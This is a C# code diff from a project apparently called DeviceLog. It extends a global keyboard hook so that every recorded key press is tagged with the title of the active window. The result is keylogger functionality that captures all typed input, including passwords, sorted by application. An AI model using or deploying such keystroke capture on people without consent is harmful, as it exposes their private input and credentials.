@@ -1,4 +1,5 @@
 ﻿using DeviceLog.Classes.Log;
+using DeviceLog.Classes.Modules.Window;
 
 namespace DeviceLog.Classes.Modules.Keyboard
 {
@@ -7,29 +8,44 @@ namespace DeviceLog.Classes.Modules.Keyboard
         private readonly KeyboardHook _keyboardHook;
         private readonly KeyboardLog _log;
 
-        internal KeyboardModule(bool keyUp, bool keyDown)
+        private string _currentWindowTitle;
+        private readonly bool _windowTitle;
+        private readonly WindowModule _windowModule;
+
+        internal KeyboardModule(bool keyUp, bool keyDown, bool windowTitle)
         {
             _keyboardHook = new KeyboardHook();
             _log = new KeyboardLog();
+            _windowModule = new WindowModule();
+
+            _currentWindowTitle = "";
+            _windowTitle = windowTitle;
 
             if (keyUp)
             {
-                _keyboardHook.KeyUp += KeyUp;
+                _keyboardHook.KeyUp += KeyPress;
             }
 
             if (keyDown)
             {
-                _keyboardHook.KeyDown += KeyDown;
+                _keyboardHook.KeyDown += KeyPress;
             }
         }
 
-        private void KeyDown(string key)
+        private void KeyPress(string key)
         {
-            _log.AddKey(key);
-        }
+            if (_windowTitle)
+            {
+                string title = _windowModule.GetActiveWindowTitle();
+                if (title != null && _currentWindowTitle != title)
+                {
+                    _currentWindowTitle = title;
 
-        private void KeyUp(string key)
-        {
+                    _log.AddKey(System.Environment.NewLine);
+                    _log.AddKey("[" + title + "]");
+                    _log.AddKey(System.Environment.NewLine);
+                }
+            }
             _log.AddKey(key);
         }
 
